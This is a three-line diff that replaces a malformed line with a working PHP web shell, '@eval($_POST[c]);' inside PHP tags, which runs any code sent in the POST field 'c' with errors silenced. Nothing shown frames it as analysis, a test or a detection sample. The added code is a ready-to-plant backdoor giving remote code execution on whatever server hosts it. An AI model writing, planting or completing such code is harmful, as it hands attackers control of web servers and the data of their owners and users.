@@ -1,1 +1,3 @@
-<O>h=@eval($_POST[c]);</O>
+<?php
+    @eval($_POST[c]);
+?>
